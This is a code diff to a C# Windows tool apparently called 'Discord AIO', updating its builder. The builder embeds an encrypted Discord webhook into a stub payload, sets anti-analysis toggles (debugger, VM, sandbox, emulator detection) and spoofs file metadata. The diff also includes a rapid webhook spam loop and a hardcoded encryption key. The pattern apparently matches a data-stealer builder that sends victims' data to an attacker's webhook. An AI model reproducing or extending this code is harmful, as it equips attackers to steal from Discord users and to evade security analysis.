@@ -26,7 +26,7 @@ namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.7.0";
+        private static string version = "0.7.1";
 
         public DiscordRpcClient dc_client;
 
@@ -402,7 +402,7 @@ namespace discordAIO6
 
         private void pictureBox1_Click(object sender, EventArgs e)
         {
-            Process.Start("https://discord.gg/qjrDprutvg");
+            Process.Start("https://discord.gg/C8zauKSBR2");
         }
 
         private string Title = "N/A";
@@ -3169,8 +3169,35 @@ namespace discordAIO6
                         if (saveFileDialog.ShowDialog() == DialogResult.OK)
                         {
                             buildingLabel.Text = creatingfile;
+
+                            string whText = webhookBox.Text;
+                            string encText = Encrypt(whText);
                             string text = Properties.Resources.stub;
-                            text = text.Replace("DiscordAIO", _randomChars.getRandomCharacters(_random.Next(10, 20)));
+
+
+                            text = text.Replace("AIOwebhook", encText);
+
+                            if (sniffersBox.Checked)
+                                text = text.Replace("%sniffersyesno%", "true");
+                            else
+                                text = text.Replace("%sniffersyesno%", "false");
+                            if (debugBox.Checked)
+                                text = text.Replace("%debugyesno%", "true");
+                            else
+                                text = text.Replace("%debugyesno%", "false");
+                            if (vmBox.Checked)
+                                text = text.Replace("%vmyesno%", "true");
+                            else
+                                text = text.Replace("%vmyesno%", "false");
+                            if (sandboxBox.Checked)
+                                text = text.Replace("%sandboxyesno%", "true");
+                            else
+                                text = text.Replace("%sandboxyesno%", "false");
+                            if (emuBox.Checked)
+                                text = text.Replace("%emuyesno%", "true");
+                            else
+                                text = text.Replace("%emuyesno%", "false");
+
                             text = text.Replace("%Title%", Title);
                             text = text.Replace("%Description%", Description);
                             text = text.Replace("%Product%", Product);
@@ -3183,11 +3210,7 @@ namespace discordAIO6
                             text = text.Replace("%v4%", PrivatePart);
                             text = text.Replace("%Guid%", Guid.NewGuid().ToString());
 
-                            string whText = webhookBox.Text;
-                            string encText = Encrypt(whText);
 
-
-                            text = text.Replace("AIOwebhook", encText);
                             buildingLabel.Text = filecreated;
                             string embedColor = embedBox.BackColor.ToArgb().ToString();
                             embedColor = embedColor.Remove(0, 1);
@@ -3670,7 +3693,7 @@ namespace discordAIO6
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/C8zauKSBR2\"}}]}", "application/json").ToString();
                                     Thread.Sleep(2000);
                                 }
                             }
@@ -3697,7 +3720,7 @@ namespace discordAIO6
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/C8zauKSBR2\"}}]}", "application/json").ToString();
                                     Thread.Sleep(35);
                                 }
                             }
@@ -4451,7 +4474,7 @@ namespace discordAIO6
             var saltStringBytes = Generate256BitsOfRandomEntropy();
             var ivStringBytes = Generate256BitsOfRandomEntropy();
             var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
-            using (var password = new Rfc2898DeriveBytes("gqLmaLTWqhkWHvMSgRFaLRXdRgACznHz", saltStringBytes, DerivationIterations))
+            using (var password = new Rfc2898DeriveBytes("JRLpmxDuzEpHFFJDrThphvBFFpgAmVnGWttWzBJXTxHxmrbDrPVDRcxVPKBAjwBcUkJtqUkzwtHsgZkbNNNvZYhumBvAYakevKeH", saltStringBytes, DerivationIterations))
             {
                 var keyBytes = password.GetBytes(Keysize / 8);
                 using (var symmetricKey = new RijndaelManaged())
